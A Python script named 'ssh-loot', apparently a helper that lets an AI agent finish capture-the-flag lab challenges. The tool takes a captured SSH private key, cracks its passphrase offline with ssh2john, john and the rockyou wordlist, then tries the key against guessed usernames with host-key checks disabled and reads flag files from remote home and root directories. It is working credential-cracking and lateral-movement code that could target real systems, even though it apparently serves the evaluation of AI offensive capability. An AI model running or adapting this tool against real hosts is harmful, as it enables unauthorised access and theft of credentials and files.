#!/usr/bin/env python3
"""Deterministic SSH-pivot helper (`ssh-loot`).

The agent reliably steals + cracks an SSH key but UNreliably assembles the final pivot — it forgets
the username (named in a README), or wanders into password brute-forcing instead of using the key.
This helper does the pivot deterministically: try the captured key against candidate users (incl.
ones named in a README clue) and read the flag from the user's home. Same 'give the model a
deterministic capability' pattern as web-rce. Self-contained (uses the ssh binary on the runner)."""
import argparse
import re
import subprocess
import sys

DEFAULT_USERS = ["root", "admin", "deploy", "analyst", "ubuntu", "user", "git",
                 "www-data", "service", "operator", "ec2-user", "pi"]


def candidate_users(extra=None, readme: str = "") -> list:
    """Ordered, deduped username candidates: explicit --users first, then any account named in a
    README/clue ('... for the <user> service account', 'key for <user>'), then sensible defaults."""
    users = list(extra or [])
    for pat in (r"for the (\w+) service account", r"\bfor (\w+)\b", r"key for (\w+)",
                r"(\w+) service account"):
        for m in re.finditer(pat, readme or "", re.IGNORECASE):
            users.append(m.group(1))
    users += DEFAULT_USERS
    return list(dict.fromkeys(u for u in users if u))   # order-preserving dedup


def remote_read_cmd() -> str:
    """Read the flag where it actually lives — the user's home first, then common roots. Targeted
    paths (not a broad `find / -name flag*`, which drowns in /sys/.../flags noise)."""
    return ("cat ~/flag.txt /root/flag.txt /flag.txt /flag 2>/dev/null; "
            "for d in /home/*; do cat \"$d/flag.txt\" 2>/dev/null; done")


def ssh_argv(host: str, key: str, user: str) -> list:
    return ["ssh", "-i", key,
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "BatchMode=yes",
            "-o", "ConnectTimeout=8",
            f"{user}@{host}", remote_read_cmd()]


def ensure_decrypted(key: str, passphrase: str = "",
                     wordlist: str = "/usr/share/wordlists/rockyou.txt") -> str:
    """Return a path to a passphrase-FREE copy of the key (BatchMode ssh can't type a passphrase).
    If the key is already unencrypted, use it; else try the given passphrase, else crack it offline
    (ssh2john + rockyou) and strip the passphrase. Returns the original path if nothing is needed."""
    import os
    import re as _re
    import shutil
    if subprocess.run(["ssh-keygen", "-y", "-P", "", "-f", key],
                      capture_output=True).returncode == 0:
        return key                                  # already unencrypted
    work = key + ".dec"
    shutil.copy(key, work)
    os.chmod(work, 0o600)
    cands = [passphrase] if passphrase else []
    if not cands:
        h = key + ".hash"
        with open(h, "w") as f:
            subprocess.run(["ssh2john", key], stdout=f, stderr=subprocess.DEVNULL)
        subprocess.run(["john", f"--wordlist={wordlist}", h], capture_output=True)
        show = subprocess.run(["john", "--show", h], capture_output=True, text=True).stdout
        m = _re.search(r":([^\s:]+)", show)
        if m:
            cands.append(m.group(1))
    for pw in cands:
        if subprocess.run(["ssh-keygen", "-p", "-P", pw, "-N", "", "-f", work],
                          capture_output=True).returncode == 0:
            return work
    return work   # best effort


def run(host: str, key: str, users, passphrase: str = "") -> str:
    import re as _re
    key = ensure_decrypted(key, passphrase)
    for user in users:
        try:
            p = subprocess.run(ssh_argv(host, key, user), capture_output=True, text=True, timeout=25)
        except Exception:
            continue
        out = (p.stdout or "") + (p.stderr or "")
        if _re.search(r"GRIN\{[0-9a-fA-F]+\}", out):
            flag = _re.search(r"GRIN\{[0-9a-fA-F]+\}", out).group(0)
            return f"[ssh-loot] flag via {user}@{host}: {flag}\n{p.stdout.strip()}"
        if p.stdout.strip():
            return f"[ssh-loot] {user}@{host} read:\n{p.stdout.strip()}"
    return f"[ssh-loot] no flag read on {host} for users: {', '.join(users)}"


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(prog="ssh-loot", description="Pivot with a captured SSH key")
    ap.add_argument("--host", required=True)
    ap.add_argument("--key", default="/tmp/loot/id_rsa")
    ap.add_argument("--users", default="", help="comma-separated usernames to try first")
    ap.add_argument("--readme", default="", help="README/clue text that may name the account")
    ap.add_argument("--passphrase", default="", help="key passphrase (else cracked with rockyou)")
    a = ap.parse_args(argv)
    extra = [u.strip() for u in a.users.split(",") if u.strip()]
    print(run(a.host, a.key, candidate_users(extra, a.readme), a.passphrase))
    return 0


if __name__ == "__main__":
    sys.exit(main())
